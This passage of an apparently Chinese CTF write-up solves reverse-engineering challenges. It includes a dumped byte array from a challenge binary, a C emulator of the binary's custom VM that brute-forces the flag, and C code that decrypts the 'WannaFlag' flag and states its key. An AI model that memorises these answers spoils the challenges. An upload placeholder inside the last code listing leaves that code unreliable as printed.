x5e\xcb\x68\x5e\xb7\x92\xef\xc5\x5f\x0c\x2a\x38\xd7\x19\xe0\x5d\x66\x8f\x74\x10\x30\xae\xc5\x28\xb1\xad\xfb\xe8\x1e\x1c\xaf\x38\x54\x9a\x45\xb3\x87\x8f\x7b\x43\xfc\xa3\x0b\x4f\xbd\x46\xad\xee\xf9\xfd\x5a\xaf\x65\x44\x8a\x97\xf4\xca\xec\x38\xe3\x4c\xee\x6d\x0d\x62\x0a\xc2\x8a\x84\x70\x86\x4c\xe6\x5a\x20\x70\x17\x67\x01\xc2\x16\x6a\xce\x7e\xed\xe6\x79\x6f\x3a\x5b\xda\x4e\x4a\x46\x81\x90\xdb\xd4\x60\xfc\x73\xef\x64\x86\x50\xc0\xfa\x15\xee\x64\x9c\xb4\x39\x22\xe5\x54\x4c\xd4\x69\xd2\xc5\x58\x42\x82\x44\x28\xa8\xef\xfd\x8c\x4d\x0e\x15\x99\x27\xdc\xd3\x6b\xd7\x37\x15\x9c\xc2\xb6\x1f\x58\xd5\x75\xd9\x10\x91\xd1\xb9\x85\xfa\xa8\x79\x8a\x2c\x4b\xb8\x8d\x1d\xad\xdf\xf1\x69\x01\x5b\xf3\xd9\x98\x61\x2a\xba\x36\x79\x19\x12\xcb\x24\xb3\x38\xeb\x03\x26\xa1\x16\x31\xc1\x08\x98\x97\x1d\x2b\xe3\x10\xa3\xf1\xa6\x02\x81\x51\xb1\x9d\xe1\x0c\x87\x60\x27\xec\x8d\x70\x6f\x04\xcf\xc5\xf3\x26\x16\x1f\x2f\x6d\x42\x1b\xe7\x30\x6a\xe6\x6a\x45\xaa\x91\x9f\x35\xbb\xcb\x63\xb4\xab\x14\x8d\xcd\x3c\x36\xaf\x47\x71\x07\x8f\x52\x55\x10\x08\xbb\x20\x39\x62\xd8\x50\xd6\xb7\x74\xd3\x8c\xf8\xc4\xae\x71\x40\xd7\xb6\x78\xc3\x58\x6a\x11\x40\xc4\x5e\xed\xe9\x5c\x86\xbd\x61\x81\x56\xb4\x03\x4a\xce\x3f\xf5\xee\x70\x23\xdb\xe8\xbe\xca\xb8\xe3\x63\x43\xbf\xf0\x35\xc4\xd4\x73\x07\x0a\x6b\x23\x2c\x67\xb3\xf1\xfc\x11\x32\x69\x89\x0c\xdf\xbd\x07\x9f\xb7\x36\xb2\xc1\x98\x9a\x3c\x36\xd5\x03\x6c\xfc\x05\xef\x2c\xa6\xe1\xfa\x7e\x64\x96\x7b\x57\x9e\x22\xce\x76\xdf\x59\x0d\xda\xc8\x62\x41\xed\x37\xf7\x4f\x24\x58\xbf\x20\xa7\x75\x9d\x16\x2d\x21\x9c\x43\x0a\x50\xe1\xe4\xf6\x86\x21\x5b\xd9\xea\xfd\xf6\xae\xec\x77\x05\x62\x7c\x73\x85\x0d\xcb\x82\xd7\x48\xcd\xf3\x70\xa3\xa9\xf9\x57\x87\x92\x71\x88\x71\x43\x32\x17\x28\x94\xa5\x4b\x55\x6c\xed\x2c\xd0\x05\xde\xbd\xd0\x7b\xa1\x74\x27\xe3\x96\xa3\x33\x43\x18\x99\x2d\xfe\x7c\x6d\xac\x7b\x13\xf8\x33\x05\x8d\x3b\x1d\xd9\x36\x09\x1d\x41\x89\x2f\xec\xdb\x80\xd9\x09\x54\xc0\x3e\xda\x9f\x01\xda\x06\x7d\x80\x66\xc2\x03\xd6\x48\x96\x74\x39\xb2\x69\x05\xd3\x6f\x6c\xae\xb9\x69\xb0\x82\x9f\x9f\x86\xce\x0e\x96\x11\xa7\x5d\xd6\x4f\x6d\x15\xf7\xbd\x40\x2e\xca\x7b\x6d\xa1\xa3\x72\x39\x56\xc6\x15\xbb\x67\xe2\xb0\xeb\xbe\xeb\xd2\xca\x41\x7f\x4a\x93\xa4\x13\x9d\x0f\x57\xe8\xcb\xaa\xb0\x6c\xf5\x8a\x1c\x96\x0f\xc8\xc9\xf5\x05\x71\x29\xa7\xe2\xbb\x59\x0a\x94\x5d\xca\x34\x77\x17\xe9\x14\xb4\x5e\x3b\x67\xdd\x3c\xfc\x93\x2e\x66\xe2\xc0\xc9\x12\x15\xbb\xdb\xa5\xb6\x8c\xe5\x3e\x7b\x7a\xa7\xfe\x41\x3b\x5e\xcf\xa7\x13\x70\x78\xae\x2a\xfc\x17\xde\xac\xe4\x4c\x89\xec\xab\x4e\x2e\xa9\x45\xa0\xd3\x8a\x1c\x13\x80\xfa\x2b\x85\x19\xf3\xed\x99\x91\x1d\xd2\xc9\xb7\x2a\x4e\xff\x79\xb4\x06\x96\x18\xbf\x41\x06\x78\x35\xe7\xfa\xb9\x1c\x96\x29\xb6\xe2\xce\x20\x68\x16\xe6\xba\x76\xce\x32\x73\x2c\x83\x52\xe3\x16\x7c\xac\xe0\xce\xe8\xd1\x37\xfd\xb4\x97\x52\x76\x12\x7d\xee\xd7\xd3\xb5\xcf\xb2\x37\x73\x4b\x15\x53\x7f\xfe\x82\xe1\xd9\x2a\x43\x15\xb9\xb6\x76\x2e\x8a\xeb\x05\x11\xdc\x25\x93\x61\x12\x46\x01\x90\x12\x3a\xec\xd9\x76\xac\x48\x41\x58\xd8\xee\x20\x98\xe1\xbe\x86\xae\xb1\x55\x30\x35\x71\x78\xbb\x5e\xdd\x10\x6f\x26\xe4\xf4\x24\x99\xcc\x57\x42\xd7\xa4\xda\xf3\xe9\xdc\x46\x1d\xba\x5f\xb6\xf8\x02\x24\x28\xa7\x23\x84\x62\x6f\x36\x4d\x90\xac\xfb\xde\x78\xa6\xa3\x0a\x7e\xfc\xfd\x59\x3f\x03\x22\x9b\x56\xab\x5b\x5c\x9e\x47\x82\x07\x86\x40\x87\x1f\x10\x16\x68\x78\x45\x59\x93\x05\x9c\x01\x95\xf6\x13\xc3\x62\xf7\xe6\x94\xc8\xe3\xa5\x01\x75\x9f\x13\x7c\x14\x77\xf1\xe6\xe2\x1e\x49\x73\xfc\x22\x92\xa3\x61\x35\x7e\x67\x9c\x93\xbf\x32\xef\x66\x2d\x72\xf1\x25\x44\x79\x9b\x4d\xbd\x41\xf7\x92\x5f\x69\xc8\x18\x7b\x51\x4f\x92\xc7\x8f\x18\x4b\x55\x8d\x51\xc2\xcb\xf9\xe9\xac\xdf\xcd\xa4\x28\xaf\xb1\x7a\x44\x2d\x9e\x6f\x30\x4b\x01\xa7\xc2\x2d\xd3\x1f\x4a\x58\x83\x40\x47\xa3\xa4\xa2\x7f\x8e\xc7\x24\xff\x67\x69\xca\x7c\x22\x84\x50\x6c\x93\x5a\x2a\x66\x56\xd6\x80\x01\x66\x1e\x18\xcc\x7b\xd6\xa6\x6f\xe0\x86\x8b\xc5\x89\x02\x7c\x9b\x2a\xd9\x85\xb5\x32\xf3\xa5\xcf\xa4\x93\x5e\xbf\xce\xf0\xb3\x50\x28\xbb\x17\xb7\xaa\xaf\x64\xbf\x02\xda\x14\x98\x92\x51\xe0\xe4\x4f\xc5\x22\xc4\x60\xbd\x7d\x32\x6b\x4b\xc8\x5a\x9b\xc7\x5f\x89\x8e\x1c\x51\x23\xf2\x2f\x7e\x40\xdc\x6e\x76\x06\x89\xec\x71\x8e\x16\x2f\x85\xb7\xb6\x04\xd6\x8f\x9c\xe2\xe2\x96\xc8\xc1\xa3\xc8\xe9\x51\x9a\x3c\xe4\x94\x0f\x3f\xb8\xfa\xb7\x9c\xd6\xfe\x32\x81\xa5\x13\x21\x63\x4e\x76\x87\x06\xbc\x2a\x68\x61\xf0\xd2\x87\x61\x53\x68\x9c\x22\xe3\x52\x37\x99\xae\x69\x82\x79\x72\x61\xe0\x20\x19\xa4\x76\x47\xc0\xf1\xc6\x4d\xa4\xaa\x94\x07\x06\x69\x51\x46\xa0\x69\x70\xdc\x93\x3c\xbb\xc2\x0f\xcb\x78\xd5\x46\x7f\xd2\xd1\x2c\xc1\xc1\x3b\x71\x80\xad\xf1\x3a\x97\x6b\xba\xec\x0c\x20\x32\xde\x72\xf6\x22\x3f\x54\x1f\xfd\x4d\xab\xb4\x7a\xf4\x3a\xb2\xf3\x5b\xa1\x72\x76\x3c\xbd\x85\xb7\xfb\xf3\x1a\x4a\x29\xd5\x96\xbf\xc2\xf4\x0a\xea\xe4\xe1\xa8\x14\x8f\x47\xf5\x30\x71\x7c\xec\xc6\x36\x79\xcd\xc0\x92\x95\x9b\x30\x72\x94\xee\xf1\x1a\xd7\xe0\x88\xc5\xe6\x8d\x4d\xf9\x2d\x37\x5d\x5c\xea\x90\xbc\x72\xc9\xc3\x55\x89\xe5\x83\xec\x18\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\x83\xec\x0c\x6a\x3c\xe8\xa3\xf7\xff\xff\x83\xc4\x10\x89\x45\xf0\x8b\x45\xf0\xc7\x00\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x04\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x08\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x0c\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x10\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x14\x00\x00\x00\x00\x8b\x45\xf0\xc7\x40\x24\x00\x00\x00\x00\x83\xec\x08\x6a\x50\x6a\x04\xe8\xcc\xf7\xff\xff\x83\xc4\x10\x89\xc2\x8b\x45\xf0\x89\x50\x28\x8b\x45\xf0\x8b\x40\x28\x05\x3c\x01\x00\x00\x89\xc2\x8b\x45\xf0\x89\x50\x18\x8b\x45\xf0\x8b\x40\x28\x05\x3c\x01\x00\x00\x89\xc2\x8b\x45\xf0\x89\x50\x1c\x8b\x45\xf0\xc7\x40\x20\x00\x00\x00\x00\x8b\x45\xf0\x8b\x4d\xf4\x65\x33\x0d\x14\x00\x00\x00\x74\x05\xe8\xed\xf6\xff\xff\xc9\xc3\x55\x89\xe5\x57\x56\x53\x83\xec\x3c\x8b\x45\x08\x89\x45\xc4\x8b\x45\x0c\x89\x45\xc0\x8b\x45\x10\x89\x45\xbc\x65\xa1\x14\x00\x00\x00\x89\x45\xe4\x31\xc0\xb8\x22\x00\x00\x00\x99\xf7\x7d\xc0\x83\xc0\x09\x89\x45\xd8\x8b\x45\xd8\x69\xc0\xf0\x2f\x78\x4e\x89\x45\xd0\x8b\x45\xc4\x8b\x00\x89\x45\xcc\x8b\x45\xd0\xc1\xe8\x02\x83\xe0\x03\x89\x45\xdc\x8b\x45\xc0\x83\xe8\x01\x89\x45\xd4\xe9\xa7\x00\x00\x00\x8b\x45\xd4\x05\xff\xff\xff\x3f\x8d\x14\x85\x00\x00\x00\x00\x8b\x45\xc4\x01\xd0\x8b\x00\x89\x45\xe0\x8b\x45\xd4\x8d\x14\x85\x00\x00\x00\x00\x8b\x45\xc4\x01\xc2\x8b\x45\xd4\x8d\x0c\x85\x00\x00\x00\x00\x8b\x45\xc4\x01\xc8\x8b\x08\x8b\x45\xe0\xc1\xe8\x04\x89\xc3\x8b\x45\xcc\x01\xc0\x31\xc3\x8b\x45\xcc\xc1\xe8\x03\x89\xc6\x8b\x45\xe0\xc1\xe0\x05\x31\xf0\x01\xd8\x8d\x58\x28\x8b\x45\xd0\x33\x45\xcc\x83\xf0\x77\x89\xc6\x8b\x45\xd4\x83\xe0\x03\x33\x45\xdc\x8d\x3c\x85\x00\x00\x00\x00\x8b\x45\xbc\x01\xf8\x8b\x00\x33\x45\xe0\x01\xf0\x83\xe8\x0f\x31\xd8\x29\xc1\x89\xc8\x89\x02\x8b\x45\xd4\x8d\x14\x85\x00\x00\x00\x00\x8b\x45\xc4\x01\xd0\x8b\x00\x89\x45\xcc\x83\x6d\xd4\x01\x83\x7d\xd4\x00\x0f\x85\x4f\xff\xff\xff\x8b\x45\xc0\x05\xff\xff\xff\x3f\x8d\x14\x85\x00\x00\x00\x00\x8b\x45\xc4\x01\xd0\x8b\x00\x89\x45\xe0\x8b\x45\xc4\x8b\x10\x8b\x45\xe0\xc1\xe8\x04\x89\xc1\x8b\x45\xcc\x01\xc0\x31\xc1\x8b\x45\xcc\xc1\xe8\x03\x89\xc3\x8b\x45\xe0\xc1\xe0\x05\x31\xd8\x01\xc8\x8d\x48\x28\x8b\x45\xd0\x33\x45\xcc\x83\xf0\x77\x89\xc3\x8b\x45\xd4\x83\xe0\x03\x33\x45\xdc\x8d\x34\x85\x00\x00\x00\x00\x8b\x45\xbc\x01\xf0\x8b\x00\x33\x45\xe0\x01\xd8\x83\xe8\x0f\x31\xc8\x29\xc2\x8b\x45\xc4\x89\x10\x8b\x45\xc4\x8b\x00\x89\x45\xcc\x81\x6d\xd0\xf0\x2f\x78\x4e\x83\x6d\xd8\x01\x83\x7d\xd8\x00\x0f\x85\xa3\xfe\xff\xff\x90\x8b\x45\xe4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\x33\xf5\xff\xff\x83\xc4\x3c\x5b\x5e\x5f\x5d\xc3\x55\x89\xe5\x83\xec\x28\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xc7\x45\xd8\x38\x88\x04\x08\xc7\x45\xe4\x18\x00\x00\x00\xc7\x45\xe8\x22\x00\x00\x00\xc7\x45\xec\x30\x00\x00\x00\xc7\x45\xf0\x11\x00\x00\x00\xc7\x45\xdc\x6a\x01\x00\x00\x83\xec\x04\x6a\x07\x68\x00\x20\x00\x00\x68\x00\x80\x04\x08\xe8\x9c\xf4\xff\xff\x83\xc4\x10\x8b\x45\xd8\x89\x45\xe0\x83\xec\x04\x8d\x45\xe4\x50\xff\x75\xdc\xff\x75\xe0\xe8\xd6\xfd\xff\xff\x83\xc4\x10\x90\x8b\x45\xf4\x65\x33\x05\x14\x00\x00\x00\x74\x05\xe8\xac\xf4\xff\xff\xc9\xc3\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x51\x83\xec\x24\x89\xc8\x8b\x10\x89\x55\xe4\x8b\x40\x04\x89\x45\xe0\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\xe8\x27\xf6\xff\xff\x83\xec\x08\x68\x8c\xb2\x04\x08\x68\x16\x92\x04\x08\xe8\xda\xf4\xff\xff\x83\xc4\x10\xe8\xb4\xfc\xff\xff\x89\x45\xf0\x8b\x45\xf0\xc7\x40\x20\x80\xb0\x04\x08\xe8\x25\xff\xff\xff\x83\xec\x0c\xff\x75\xf0\xe8\xed\xf6\xff\xff\x83\xc4\x10\xb8\x00\x00\x00\x00\x8b\x4d\xf4\x65\x33\x0d\x14\x00\x00\x00\x74\x05\xe8\x2c\xf4\xff\xff\x8b\x4d\xfc\xc9\x8d\x61\xfc\xc3\x66\x90\x66\x90\x55\x57\x56\x53\xe8\xf7\xf4\xff\xff\x81\xc3\x87\x1e\x00\x00\x83\xec\x0c\x8b\x6c\x24\x20\x8d\xb3\x0c\xff\xff\xff\xe8\x7b\xf3\xff\xff\x8d\x83\x08\xff\xff\xff\x29\xc6\xc1\xfe\x02\x85\xf6\x74\x25\x31\xff\x8d\xb6\x00\x00\x00\x00\x83\xec\x04\xff\x74\x24\x2c\xff\x74\x24\x2c\x55\xff\x94\xbb\x08\xff\xff\xff\x83\xc7\x01\x83\xc4\x10\x39\xf7\x75\xe3\x83\xc4\x0c\x5b\x5e\x5f\x5d\xc3\x8d\x76\x00\xf3\xc3\x00\x00\x53\x83\xec\x08\xe8\x93\xf4\xff\xff\x81\xc3\x23\x1e\x00\x00\x83\xc4\x08\x5b\xc3\x03\x00\x00\x00\x01\x00\x02\x00\x4d\x61\x79\x62\x65\x20\x79\x6f\x75\x20\x77\x69\x6c\x6c\x20\x6c\x69\x6b\x65\x20\x69\x74\x2e\x2e\x2e\x2e\x2e\x00\x25\x70\x0a\x00\x66\x6c\x61\x67\x3a\x00\x25\x6c\x6c\x64\x00\x00\x01\x1b\x03\x3b\x60\x00\x00\x00\x0b\x00\x00\x00\x14\xf3\xff\xff\x7c\x00\x00\x00\x1f\xf5\xff\xff\xa0\x00\x00\x00\x8d\xf5\xff\xff\xc0\x00\x00\x00\xd3\xf5\xff\xff\xe0\x00\x00\x00\x1c\xf6\xff\xff\x00\x01\x00\x00\xc6\xfb\xff\xff\x24\x01\x00\x00\x89\xfc\xff\xff\x44\x01\x00\x00\x49\xfe\xff\xff\x74\x01\x00\x00\xca\xfe\xff\xff\x94\x01\x00\x00\x54\xff\xff\xff\xc0\x01\x00\x00\xb4\xff\xff\xff\x0c\x02\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x7a\x52\x00\x01\x7c\x08\x01\x1b\x0c\x04\x04\x88\x01\x00\x00\x20\x00\x00\x00\x1c\x00\x00\x00\x90\xf2\xff\xff\x00\x01\x00\x00\x00\x0e\x08\x46\x0e\x0c\x4a\x0f\x0b\x74\x04\x78\x00\x3f\x1a\x3b\x2a\x32\x24\x22\x1c\x00\x00\x00\x40\x00\x00\x00\x77\xf4\xff\xff\x6e\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x02\x6a\xc5\x0c\x04\x04\x00\x1c\x00\x00\x00\x60\x00\x00\x00\xc5\xf4\xff\xff\x46\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x02\x42\xc5\x0c\x04\x04\x00\x1c\x00\x00\x00\x80\x00\x00\x00\xeb\xf4\xff\xff\x49\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x02\x45\xc5\x0c\x04\x04\x00\x20\x00\x00\x00\xa0\x00\x00\x00\x14\xf5\xff\xff\xaa\x05\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x44\x83\x03\x03\xa2\x05\xc5\xc3\x0c\x04\x04\x1c\x00\x00\x00\xc4\x00\x00\x00\x9a\xfa\xff\xff\xc3\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x02\xbf\xc5\x0c\x04\x04\x00\x2c\x00\x00\x00\xe4\x00\x00\x00\x3d\xfb\xff\xff\xc0\x01\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x46\x87\x03\x86\x04\x83\x05\x03\xb3\x01\xc3\x41\xc6\x41\xc7\x41\xc5\x0c\x04\x04\x00\x00\x00\x1c\x00\x00\x00\x14\x01\x00\x00\xcd\xfc\xff\xff\x81\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x42\x0d\x05\x02\x7d\xc5\x0c\x04\x04\x00\x28\x00\x00\x00\x34\x01\x00\x00\x2e\xfd\xff\xff\x86\x00\x00\x00\x00\x44\x0c\x01\x00\x47\x10\x05\x02\x75\x00\x43\x0f\x03\x75\x7c\x06\x02\x73\x0c\x01\x00\x41\xc5\x43\x0c\x04\x04\x48\x00\x00\x00\x60\x01\x00\x00\x8c\xfd\xff\xff\x5d\x00\x00\x00\x00\x41\x0e\x08\x85\x02\x41\x0e\x0c\x87\x03\x41\x0e\x10\x86\x04\x41\x0e\x14\x83\x05\x4e\x0e\x20\x69\x0e\x24\x44\x0e\x28\x44\x0e\x2c\x41\x0e\x30\x4d\x0e\x20\x47\x0e\x14\x41\xc3\x0e\x10\x41\xc6\x0e\x0c\x41\xc7\x0e\x08\x41\xc5\x0e\x04\x00\x00\x10\x00\x00\x00\xac\x01\x00\x00\xa0\xfd\xff\xff\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" `}`;
#include&lt;cstdio&gt;
#include&lt;cstdlib&gt;
#include &lt;cstring&gt;
#pragma pack(4)  
struct CVM
`{`
    int _BEGIN;
    int _REG_A;
    int X;
    int Z;
    int Y;
    int W;
    int* _ESP;
    int* stack_esp;
    unsigned __int8* __EIP;
    int REG_B;
    int* stack_low;
    int YYY;
`}`;

CVM* CVM_INIT()
`{`
    CVM* v1; // [esp+8h] [ebp-10h]

    v1 = (CVM*)malloc(0x3Cu);
    v1-&gt;_BEGIN = 0;
    v1-&gt;_REG_A = 0;
    v1-&gt;X = 0;
    v1-&gt;Z = 0;
    v1-&gt;Y = 0;
    v1-&gt;W = 0;
    v1-&gt;REG_B = 0;
    v1-&gt;stack_low = (int*)calloc(4u, 80u);
    v1-&gt;_ESP = v1-&gt;stack_low + 79;
    v1-&gt;stack_esp = v1-&gt;stack_low + 79;
    v1-&gt;__EIP = 0;
    return v1;
`}`
int MEMORY[200] = `{` 0 `}`;
int __cdecl sub_80487EF(CVM* VM, unsigned int a2)
`{`
    int result; // eax

    result = 0;
    if (a2 &lt;= 2)
        result = VM-&gt;__EIP[a2];
    return result;
`}`
CVM* CVm;
void inline INFO() `{`
   // printf("code:%d,%X\n",(unsigned char) *CVm-&gt;__EIP, (unsigned char)*CVm-&gt;__EIP);
`}`
int TRY(long long  input_num,char * INPUT) `{`
    CVm = CVM_INIT();
    CVm-&gt;__EIP = (unsigned char*)CODES;
    int cnt = 0;
    unsigned char* v2 = 0;

    while (1)

    `{`
        if (*CVm-&gt;__EIP == 113)
        `{`
            INFO();
            *--CVm-&gt;_ESP = *(unsigned int*)(CVm-&gt;__EIP + 1);
            CVm-&gt;__EIP += 5;
        `}`
        if (*CVm-&gt;__EIP == 65)
        `{`
            INFO();
            //printf("A + %d\n", CVm-&gt;X);
            CVm-&gt;_REG_A += CVm-&gt;X;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 66)
        `{`
            INFO();
            //printf("A - %d\n", CVm-&gt;Y);
            CVm-&gt;_REG_A -= CVm-&gt;Y;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 67)
        `{`
            INFO();
            //printf("A * %d\n", CVm-&gt;Z);
            CVm-&gt;_REG_A *= CVm-&gt;Z;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 68)
        `{`

            INFO();
            //printf("A / %d\n", (unsigned int)CVm-&gt;W);
            CVm-&gt;_REG_A /= (unsigned int)CVm-&gt;W;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0x80)
        `{`
            INFO();
            *(&amp;CVm-&gt;_BEGIN + sub_80487EF(CVm, 1u)) = *(unsigned int*)(CVm-&gt;__EIP + 2);
            CVm-&gt;__EIP += 6;
        `}`
        if (*CVm-&gt;__EIP == 119)
        `{`
            INFO();
            //printf("A xor %d\n", CVm-&gt;REG_B);
            CVm-&gt;_REG_A ^= CVm-&gt;REG_B;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 83)
        `{`
            INFO();
            putchar(*(char*)CVm-&gt;Z);
            CVm-&gt;__EIP += 2;
        `}`
        if (*CVm-&gt;__EIP == 34)
        `{`
            INFO();
            //printf("A &gt;&gt; %d\n", CVm-&gt;X);
            CVm-&gt;_REG_A = (unsigned int)CVm-&gt;_REG_A &gt;&gt; CVm-&gt;X;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 35)
        `{`
            INFO();
            //printf("A &lt;&lt; %d\n", CVm-&gt;X);
            CVm-&gt;_REG_A &lt;&lt;= CVm-&gt;X;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0x99) `{`
            INFO();
            break;
        `}`

        if (*CVm-&gt;__EIP == 'v')
        `{`
            INFO();
            CVm-&gt;Z = *CVm-&gt;_ESP;
            *CVm-&gt;_ESP++ = 0;
            CVm-&gt;__EIP += 5;
        `}`
        if (*CVm-&gt;__EIP == 'T')
        `{`
            INFO();
            v2 = (unsigned char*)CVm-&gt;Z;
            *v2 = getchar();
            CVm-&gt;__EIP += 2;
        `}`
        if (*CVm-&gt;__EIP == '0')
        `{`
            INFO();
            //printf("A | %d\n", CVm-&gt;X);
            CVm-&gt;_REG_A |= CVm-&gt;X;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == '1')
        `{`
            INFO();
            //printf("A &amp; %d\n", CVm-&gt;X);
            CVm-&gt;_REG_A &amp;= CVm-&gt;X;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 9)
        `{`
            INFO();
            CVm-&gt;_REG_A = input_num;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 16)
        `{`
            INFO();
            CVm-&gt;REG_B = CVm-&gt;_REG_A;
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 17)
        `{`
            INFO();

            //printf("%p\n", (const void*)CVm-&gt;_REG_A);
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xA0)
        `{`
            INFO();
            if (CVm-&gt;_REG_A != 0x26F8D100)
            `{`
                //printf("NO");
                goto ret;
            `}`
            else `{`
                //printf("GOOD %lld", input_num);
                //exit(0);
            `}`
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xA1)
        `{`
            INFO();
            //printf("flag:");
            if (strlen((const char*)INPUT) != 33) `{`
                printf("length error\n");
                exit(0);
            `}`

            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xB1)
        `{`
            INFO();
            CVm-&gt;REG_B = MEMORY[0];
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xB2)
        `{`
            INFO();
            CVm-&gt;REG_B = MEMORY[1];
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xA4)
        `{`
            INFO();
            MEMORY[CVm-&gt;__EIP[1]] = CVm-&gt;_REG_A;
            CVm-&gt;__EIP += 4;
        `}`
        if (*CVm-&gt;__EIP == 0xB3)
        `{`
            INFO();
            CVm-&gt;REG_B = MEMORY[2];
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xB4)
        `{`
            INFO();
            CVm-&gt;REG_B = MEMORY[3];
            ++CVm-&gt;__EIP;
        `}`
        if (*CVm-&gt;__EIP == 0xC1)
        `{`
            INFO();
            CVm-&gt;_REG_A = INPUT[CVm-&gt;__EIP[1]];
            CVm-&gt;__EIP += 2;
        `}`
        if (*CVm-&gt;__EIP == 0xC2)
        `{`
            INFO();
            if (CVm-&gt;_REG_A != *(unsigned int*)(CVm-&gt;__EIP + 1))
            `{`
                //printf("%d != %d\n", CVm-&gt;_REG_A, *(unsigned int*)(CVm-&gt;__EIP + 1));
                return cnt;
            `}`
            else `{`
                cnt++;
                //printf("%d == %d\n", CVm-&gt;_REG_A, *(unsigned int*)(CVm-&gt;__EIP + 1));

            `}`

            CVm-&gt;__EIP += 5;
        `}`
    `}`
ret:
    free(CVm-&gt;stack_low);
    return cnt;
    //free(CVm);

`}`

int main() `{`

    //// SMC
    //int key[4];
    //key[0] = 24;
    //key[1] = 34;
    //key[2] = 48;
    //key[3] = 17;
    //dec((unsigned int*)buf, 362, key);
    //for (size_t i = 0; i &lt; sizeof(buf); i++)
    //`{`
    //    printf("%02x ", (unsigned char)buf[i]);
    //`}`

    char buf[34];
    memset(buf, 'b', 33);

    buf[33] = 0;
    for (size_t i = 0; i &lt; 33; i++)
    `{`
        for (size_t j = 0x21; j &lt; 0x7f; j++)
        `{`
            buf[i] = j;

            if (TRY(8536025124571757722, buf) == i + 1) `{`
                printf("%c ", j);
                break;
            `}`
        `}`

    `}`
    puts(buf);


`}`
```

### <a class="reference-link" name="check%20in"></a>check in

ruby<br>
aes解密

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a8937ff66104f58f.png)

### <a class="reference-link" name="WannaFlag"></a>WannaFlag

程序首先对input[4]%7，然后for i in range(2, input[4]%7): xor0 *= i<br>
然后输入先和xor0异或，这里爆破一下就得到xor0的值了<br>
难点在第二个xor时的rol，python写这个真的头大，最后在C上面写完了<br>
第二部分时input[i]^table[i]然后rol i<br>
然后就直接把flag解密出来了。。。<br>
key=`wannaflag_is_just_a_paper_tiger`

```
#include &lt;stdio.h&gt;

int main()
`{`
    unsigned char xor1[] = `{`0x41,0x4E,0x4E,0x41,0x57,0x47,0x41,0x4C,0x46,0x59,0x42,0x4B,0x56,0x49,0x41,0x48
,0x4D,0x58,0x54,0x46,0x43,0x41,0x41,0x43,0x4C,0x41,0x41,0x41,0x41,0x59,0x4B,0x00`}`;
    unsigned char table[] = `{`0x4E,0xAE,0x61,0xBA,0xE4,0x2B,0x55,0xAA
,0x59,0xFC,0x4D,0x02,0x17,0x6B,0x13,0xA1,0x41,0xFE,0x35,0x0B,0xB4,0x0B,0x52,0x2F
,0x46,0xCC,0x35,0x82,0xE5,0x88,0x50,0x00`}`;

    unsigned char tmp;
    for (int idx = 0; idx &lt; 7; idx++) `{`
        int xor0 = 1;
![Uploading file..._mqdyfpzu6]()
        for (int a = 2; a &lt; idx; a++) `{`
            xor0 *= a;
        `}`
        for (int i = 0; i &lt; 32; i++) `{`
            // printf("0x%2x:",(unsigned char)(table[i] &lt;&lt; (8 - (i%8)) | (table[i] &gt;&gt; (i%8))));
            tmp = (table[i] &lt;&lt; (8 - (i%8)) | (table[i] &gt;&gt; (i%8)))^xor1[i]^xor0;
            printf("%c", tmp);
        `}`
        puts("");
    `}`
`}`
```

